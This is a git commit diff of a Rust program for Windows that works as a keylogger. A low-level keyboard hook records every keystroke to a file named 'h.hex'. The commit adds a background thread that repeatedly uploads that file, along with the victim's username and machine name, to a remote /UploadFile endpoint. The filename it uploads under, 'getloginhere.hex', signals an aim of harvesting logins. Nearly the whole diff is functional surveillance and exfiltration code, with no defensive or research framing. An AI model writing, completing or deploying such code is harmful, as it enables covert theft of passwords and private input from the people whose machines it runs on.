5969175e9f0f32d2bd4fa02f7c07ced54e58a105
Knaro <84656846+12e9881f53658734f7d0005e8f9091def068a65@users.noreply.github.com>
2023-12-18 19:38:55 -0800

    fat update

--- src/main.rs
+++ src/main.rs
@@ -1,38 +1,98 @@
-#![windows_subsystem = "windows"]
-use windows::Win32::{
-    UI::WindowsAndMessaging::{
-        CallNextHookEx, SetWindowsHookExW, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, GetMessageW, DispatchMessageW, TranslateMessage, MSG, HHOOK, WM_KEYDOWN, WH_KEYBOARD_LL
+//#![windows_subsystem = "windows"]
+use windows::{
+    Win32::{
+        UI::WindowsAndMessaging::{
+            CallNextHookEx, SetWindowsHookExW, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, GetMessageW, DispatchMessageW, TranslateMessage, MSG, HHOOK, WM_KEYDOWN, WH_KEYBOARD_LL
+        },
+        Foundation::{
+            HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
+        },
+        System::WindowsProgramming::GetUserNameW
     },
-    Foundation::{
-        HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
-    }
+    core::PWSTR
 };
 use std::{
     mem::transmute,
     fs::OpenOptions,
-    io::Write,
+    io::{Read, Write},
     thread::sleep,
-    time::Duration
+    time::Duration,
+    slice::from_raw_parts,
+    usize,
+    fs::{File, metadata},
+    thread::spawn
 };
-use reqwest;
-//https://docs.rs/reqwest/latest/reqwest/
+use serde_json::json;
+use reqwest::blocking::Client;
+use reqwest::blocking::multipart;
+
+// TODO: get hostname/mahcine name and
+//https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw
+//
+
+fn get_current_user() -> String {
+    let mut cb_buffer = 257_u32;
+    let mut buffer = Vec::<u16>::with_capacity(cb_buffer as usize);
+    let lp_buffer = PWSTR(buffer.as_mut_ptr());
+
+    unsafe {
+        let success = GetUserNameW(lp_buffer, &mut cb_buffer);
+
+        if success.is_err() {return "Error".into()}
+
+        let user_name = String::from_utf16_lossy(from_raw_parts(lp_buffer.0, cb_buffer as usize - 1));
+
+        return user_name
+    }
+}
+
+fn get_file_size(file_path: &str) -> u64 {
+    if let Ok(file_metadata) = metadata(file_path) {
+        file_metadata.len()
+    } else { 0 }
+}
+
 fn upload_file() {
     let mut last_file_size: u64 = 0;
-    let c = reqwest::Client::new(); // should i make a new client every time or should I keep this client
-
     loop {
         sleep(Duration::from_secs(10));
-        let current_file_size: u64 = 0; //get file size
+        let current_file_size: u64 = get_file_size("h.hex"); // if current file size is LESS THAN the last file size then reset last file size
 
         if current_file_size > last_file_size {
             last_file_size = current_file_size;
-            c::post("http://172.22.210.157/UploadFile").body()
+            let url = "http://127.0.0.1:8082/UploadFile";
+
+            let mut file = File::open("h.hex").expect("Failed to open file");
+            let mut content = Vec::new();
+            file.read_to_end(&mut content).expect("Failed to read file");
+
+            let json_data = json!({
+                "MachineName": "Desktop-GJDHJ21",
+                "Username": get_current_user()
+            });
+
+            let client = Client::new();
+
+            let form = multipart::Form::new()
+            .part("file", multipart::Part::bytes(content)
+            .file_name("getloginhere.hex")
+            .mime_str("application/octet-stream").unwrap())
+            .part("json_data", multipart::Part::text(serde_json::to_string(&json_data).unwrap())
+            .mime_str("application/json").unwrap());
+
+            if let Ok(res) = client.post(url).multipart(form).send() {
+                println!("Response: {:?}", res);
+            } else {
+                eprintln!("Failed to send request");
+            }
+        } else if current_file_size < last_file_size {
+            dbg!("File has been deleted and a replacement has been created!");
+            last_file_size = 0;
         }
     }
-
 }
 
-fn append_keycode_to_file(keycode: u8) -> std::io::Result<()> {
+fn append_keycode_to_file(keycode: u32) -> std::io::Result<()> {
     let mut file = OpenOptions::new().create(true).append(true).open("h.hex")?;
 
     file.write_all(&keycode.to_ne_bytes())?;
@@ -43,9 +103,12 @@ fn append_keycode_to_file(keycode: u8) -> std::io::Result<()> {
 unsafe extern "system" fn keyboard_callback(code: i32, wp: WPARAM, lp: LPARAM) -> LRESULT {
     if code >= 0 && wp.0 as u32 == WM_KEYDOWN {
         let vk_code = (*transmute::<LPARAM, *const KBDLLHOOKSTRUCT>(lp)).vkCode;
+        let _ = append_keycode_to_file(vk_code).unwrap();
+        /*
         if let Ok(vk_code_u8) = u8::try_from(vk_code) {
             let _ = append_keycode_to_file(vk_code_u8).unwrap();
         }
+        */
     }
     CallNextHookEx(HHOOK::default(), code, wp, lp)
 }
@@ -68,8 +131,11 @@ fn main() {
         HINSTANCE::default(),
         0
     ).unwrap()};
+    let _upload_thread = spawn(|| {
+        upload_file();
+    });
     message_loop();
-    std::io::stdin().read_line(&mut String::new()).unwrap();
+    //std::io::stdin().read_line(&mut String::new()).unwrap(); //End on enter.
     unsafe{UnhookWindowsHookEx(hook).unwrap()};
 }
 
